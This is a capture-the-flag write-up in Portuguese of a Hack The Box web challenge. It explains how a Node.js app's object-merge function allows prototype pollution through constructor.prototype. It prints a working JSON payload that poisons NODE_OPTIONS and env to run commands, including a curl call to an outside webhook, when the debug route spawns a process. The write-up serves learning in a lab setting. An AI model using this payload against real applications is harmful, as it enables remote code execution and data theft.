# Breaking Grad

## Breaking grad

Breaking grad é uma challenge medium, da categoria web do hackthe box​

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F4epNcx4KCae7WBP4ttm0%2Fimage.png?alt=media&#x26;token=ab3c340c-5e34-458b-9d4a-605c73808e42" alt=""><figcaption></figcaption></figure>

Baixei o código fonte da aplicação, mas antes disso, vamos dar uma olhada na página web:Basicamente temos uma view com uma única ação, onde enviamos um nome via json e recebemos uma resposta se passamos ou não:

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FZey9J6vCtRMV0e2MgDUn%2Fimage.png?alt=media&#x26;token=2db384b6-c280-4f20-a209-69e2e7e1cee0" alt=""><figcaption></figcaption></figure>

Tentei mudar o nome para nomes aleatórios, como "Portas", "", "teste", e todos retornam o mesmo response Vamos olhar o código fonte então:​Temos uma aplicação NodeJS em um container, e a flag com um nome aleatório na raíz, nada demais na configuração do container:

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FkyOmJgAPjkFpTJCve0Mf%2Fimage.png?alt=media&#x26;token=231b1626-fa33-4c21-a1d7-6b2775dee125" alt=""><figcaption></figcaption></figure>

Vamos olhar então o index.js em routes, que tem os endpoints da aplicação e podemos ver quais ações podemos fazer no app&#x20;

Podemos ver aqui as rotas e como elas executam as nossas requisições, inclusive a requisção principal do site, em /api/calculate​

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2Ft5KFCZAY226Zjln2IQ1J%2Fimage.png?alt=media&#x26;token=0f9fc646-cafe-498d-a8d7-ad54dcaac8ba" alt=""><figcaption></figcaption></figure>

Uma rota que me chamou atenção foi a /debug/:action/ vamos ver o que essa função DebugHelper.execute faz:

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F0I4HSUUX9pp6PURIGwAh%2Fimage.png?alt=media&#x26;token=49bbaaa2-834e-4845-92cb-98d36ad5c1e5" alt=""><figcaption></figcaption></figure>

Basicamente, a função verifica qual comando foi escolhido (version/ram), e dependendo de qual comando for, abre um processo no sistema operacional e executa um comando pré definido, seria o alvo perfeito para um RCE ou command injection, mas não temos controle sobre nenhum parâmetro da execução do processo, então sem problema de segurança aqui😢

Vamos olhar a rota api/calculate, como ela define se passamos ou não no exame, começando pelas funções de studentHelper

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FbLOsrkteX6qclB8pgh1Y%2Fimage.png?alt=media&#x26;token=f086de75-e7fa-49b8-b137-02f04769381f" alt=""><figcaption></figcaption></figure>

Basicamente verifica por nomes e se a grade é maior ou igual a 10, nesse \`if\` aqui:

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FccZ5iUlzXV8csGbIO5xq%2Fimage.png?alt=media&#x26;token=b57259c2-7f1e-4568-af12-0161874a3677" alt=""><figcaption></figcaption></figure>

Então, se enviarmos um nome que não tenha Baker ou Purvis, e um "paper" maior ou igual a 10, a resposta será que passamos, como vemos aqui:

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FmFVSNP3zdST7p2zFx5zb%2Fimage.png?alt=media&#x26;token=94bcbb91-9f8b-4009-9f39-d44040e9be5a" alt=""><figcaption></figcaption></figure>

​Mas ainda nenhum problema de segurança grave aqui, vamos olhar em ObjectHelper.clone:

## Prototype Pollution

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F01mGkTMIqYCm4hioQjby%2Fimage.png?alt=media&#x26;token=0a818c4f-7fef-4886-a08f-17088a22ec32" alt=""><figcaption></figcaption></figure>

Essa função faz um merge de um objeto passado por parâmetro para outro, copiando todas as chaves e valores, porém o objeto copiado é um objeto controlado pelo atacante, então temos um possível Prototype Pollution aqui!! Porém a aplicação implementou um mecanismo de segurança contra esse ataque, validando as chaves e removendo os "\_\_proto\_\_".

Prototype pollution não é uma vulnerabilidade que tenho muito conhecimento, então li esses 3 links para entender melhor como funciona e como posso explorar:

* ​[https://portswigger.net/web-security/prototype-pollution](https://portswigger.net/web-security/prototype-pollution)​
* [https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#proto-pollution-to-rce](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#proto-pollution-to-rce)​
* ​[https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)​

Com esse entendimento melhor sobre a vulnerabilidade, vi que existem outras formas de sobrescrever uma propriedade, sem ser usando o \_\_proto\_\_, podemos sobrescrever o objeto global Object.prototype.SomeThing, que fará com que todos os objetos possuam o atributo "SomeThing"

Para validar essa ideia, eu pensei que se eu pudesse adicionar um atributo "paper = 10" em todos os objetos, e fizer um post para /api/calculate, sem passar o valor de paper, a resposta irá ser "Passed", já que esse objeto student vai herdar o "paper" de object.prototype.paper, que podemos sobrescrever, usei como referência esse link: [https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#poisoning-constructor.prototype](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#poisoning-constructor.prototype)

aqui temos os testes:

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F6niaWGP0mIKcU09mpOXH%2Fimage.png?alt=media&#x26;token=a4c5defc-9153-4baf-b7ff-5c67616b7e59" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FuknnRNcYOGvU0Sycttf8%2Fimage.png?alt=media&#x26;token=ffdea90d-a56b-4dcc-b8e8-fc3c6ea87801" alt=""><figcaption></figcaption></figure>

E funcionou!! Passamos um student sem o atributo paper, e mesmo assim o resultado foi "Passed", pois agora conseguimos criar ou sobrescrever métodos e atributos globalmente!

Agora tenho duas hipóteses em mente:

* Usar alguma payload de RCE para conseguir alguma reverse shell e ler a flag
*   Achar algum atributo ou método do objeto Response do express para criar ou sobrescrever, já que esse objeto é usado em um processo do sistema, e talvez consiga algum RCE com isso:​

    <figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FjrGmGK0OnFDAkp24TZiS%2Fimage.png?alt=media&#x26;token=36af0f2a-479e-43f7-abef-b83271308d86" alt=""><figcaption></figcaption></figure>

### RCE

​A primeira ideia parece menos complexa, então vou tentar ela primeiro, lendo algumas referências sobre RCE com prototype pollution, podemos fazer um poisoning na variável env quando o node abre um processo no sistema operacional, que é exatamente o que temos no debug!\
\
Então podemos fazer o seguinte, coloquei a seguinte payload no post request

{% code title="" overflow="wrap" lineNumbers="true" %}
```json
{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require('child_process').execSync('curl https://webhook.site/8eb75854-a0fe-475f-8f26-1f0b8c184f1e').toString())//"}}
```
{% endcode %}

E entrando em /debug/version (para ativar o process que envenenamos via env) , recebo como response \`curl: not found\`

Isso quer dizer que conseguimos um RCE, mas o binário curl não existe no sistema operacional, mas tendo o RCE podemos pegar a flag!\
<br>

{{< figure src="/assets/image (84).png" alt="">}}

{{< figure src="/assets/image (82).png" alt="">}}

{{< figure src="/assets/image (85).png" alt="">}}

{{< figure src="/assets/image (81).png" alt="">}}

Achei o desafio bem legal, achei mais fácil do que médium como está descrito. Depois que percebemos a possibilidade do prototype pollution, as pesquisas que fazemos sobre essa falha retornam ótimos materiais para aprendermos como se explora ela e a partir daí não é tão difícil aplicar no desafio, mas é bem divertido de fazer!
